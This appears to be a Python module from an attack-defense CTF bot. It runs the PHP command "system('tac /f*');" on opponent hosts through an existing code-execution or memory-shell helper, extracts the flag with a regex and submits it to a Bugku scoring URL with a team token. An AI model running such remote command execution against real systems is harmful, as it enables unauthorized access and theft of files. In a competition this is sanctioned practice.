import re
from config import *
from utils.utils import Utils
class Flag:
    async def getFlag(url):
        res = await Utils.exec(url,"system('tac /f*');")
        try:
            flag = "flag{" + re.findall('flag\{(.*?)\}',res,re.S)[0] + "}"
            await Flag.submitFlag(url,flag)
        except:
            pass
    async def getFlagwithMemShell(url):
        res = await Utils.execWithMemShell(url,"system('tac /f*');")
        try:
            flag = "flag{" + re.findall('flag\{(.*?)\}',res,re.S)[0] + "}"
            await Flag.submitFlag(url,flag)
        except:
            pass
    async def submitFlag(url,flag):
        token = Config.teamToken
        posturl = "https://ctf.bugku.com/awd/submit.html?token={}&flag={}".format(token,flag)
        await Utils.trigger(posturl)
        print("{} Submited! {}".format(url,flag))